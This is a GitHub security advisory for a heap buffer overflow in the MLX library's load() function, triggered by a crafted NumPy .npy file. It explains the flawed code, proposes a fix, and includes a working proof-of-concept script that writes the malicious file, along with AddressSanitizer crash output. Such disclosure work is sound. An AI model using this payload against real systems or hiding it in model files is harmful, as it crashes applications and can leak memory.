# [M] MLX has heap-buffer-overflow in load()

## Summary
Severity: Medium
Advisory: GHSA-w6vg-jg77-2qg6
CVE: CVE-2025-62608
CWE: CWE-122
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:L/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-11-21
Source: https://github.com/advisories/GHSA-w6vg-jg77-2qg6
Type: github-advisory

## Affected
- PyPI: `mlx` — affected >=0 <0.29.4

## Details
## Summary

Heap buffer overflow in `mlx::core::load()` when parsing malicious NumPy `.npy` files. Attacker-controlled file causes 13-byte out-of-bounds read, leading to crash or information disclosure.

Environment:
- OS: Ubuntu 20.04.6 LTS
- Compiler: Clang 19.1.7

## Vulnerability

The parser reads a 118-byte header from the file, but line 268 uses `std::string(&buffer[0])` which stops at the first null byte, creating a 20-byte string instead. Then line 276 tries to read `header[34]` without checking the length first, reading 13 bytes past the allocation.

**Location**: `mlx/io/load.cpp:268,276`

**Bug #1** (line 268):
```cpp
std::string header(&buffer[0]);  // stops at first null byte
```

**Bug #2** (line 276):
```cpp
bool col_contiguous = header[34] == 'T';  // No bounds check
```

## Possible Fix

```cpp
// Line 268
std::string header(&buffer[0], header_len);

// Line 276
if (header.length() < 35) throw std::runtime_error("Malformed header");
```

## PoC

```bash
pip install mlx

# generate exploit
cat > exploit.py << 'EOF'
import struct
magic = b'\x93NUMPY'
version = b'\x01\x00'
header = b"{'descr': '<u2', 'fo\x00\x00\x00\x00n_order': False, 'shape': (3,), }"
header += b' ' * (118 - len(header) - 1) + b'\n'
with open('exploit.npy', 'wb') as f:
    f.write(magic + version + struct.pack('<H', 118) + header + b'\x00\x00\x00\x80\xff\xff')
EOF
python3 exploit.py

python3 -c "import mlx.core as mx; mx.load('exploit.npy')"
```

**AddressSanitizer Output (with instrumented build)**:
```
=================================================================
==3179==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000152 at pc 0x563345697c29 bp 0x7ffeb8ad0a50 sp 0x7ffeb8ad0a48
READ of size 1 at 0x503000000152 thread T0
    #0 0x563345697c28 in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:276:25
    #1 0x563345698da1 in mlx::core::load(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:328:10
    #2 0x563342f001bf in main /home/user1/mlx/fuzz/load/poc_crash.cpp:69:20
    #3 0x7fbd4692c082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16
    #4 0x563342e1f1cd in _start (/home/user1/mlx/fuzz/load/poc_crash+0x9181cd) (BuildId: ce2b741b3a71c93540a7ed76bc47e88952cd3099)

0x503000000152 is located 13 bytes after 21-byte region [0x503000000130,0x503000000145)
allocated by thread T0 here:
    #0 0x563342efd66d in operator new(unsigned long) (/home/user1/mlx/fuzz/load/poc_crash+0x9f666d) (BuildId: ce2b741b3a71c93540a7ed76bc47e88952cd3099)
    #1 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct<char const*>(char const*, char const*, std::forward_iterator_tag) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.tcc:219:14
    #2 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct_aux<char const*>(char const*, char const*, std::__false_type) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:251:11
    #3 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct<char const*>(char const*, char const*) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:270:4
    #4 0x5633456956fe in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::basic_string<std::allocator<char>>(char const*, std::allocator<char> const&) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:531:9
    #5 0x5633456956fe in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:268:15
    #6 0x563345698da1 in mlx::core::load(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:328:10
    #7 0x563342f001bf in main /home/user1/mlx/fuzz/load/poc_crash.cpp:69:20
    #8 0x7fbd4692c082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/user1/mlx/mlx/io/load.cpp:276:25 in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>)
Shadow bytes around the buggy address:
  0x502ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x502fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x502fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x503000000000: fa fa 00 00 04 fa fa fa 00 00 00 00 fa fa 00 00
  0x503000000080: 00 00 fa fa 00 00 00 00 fa fa 00 00 00 00 fa fa
=>0x503000000100: 00 00 00 fa fa fa 00 00 05 fa[fa]fa fa fa fa fa
  0x503000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x503000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x503000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x503000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x503000000380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3179==ABORTING
```

## Impact

- **Attack vector**: Malicious `.npy` file (model weights, datasets, checkpoints)
- **Affects**: MLX users on all platforms who call the vulnerable methods with unsanitized input.
- **Result**: Application crash + potential 13-byte heap leak


---

Credits:
- Markiyan Melnyk (ARIMLABS)
- Mykyta Mudryi (ARIMLABS)
- Markiyan Chaklosh (ARIMLABS)

## References
- https://github.com/ml-explore/mlx/security/advisories/GHSA-w6vg-jg77-2qg6
- https://nvd.nist.gov/vuln/detail/CVE-2025-62608
- https://github.com/ml-explore/mlx/pull/1
- https://github.com/ml-explore/mlx/pull/2
- https://github.com/ml-explore/mlx
- https://github.com/pypa/advisory-database/tree/main/vulns/mlx/PYSEC-2025-138.yaml
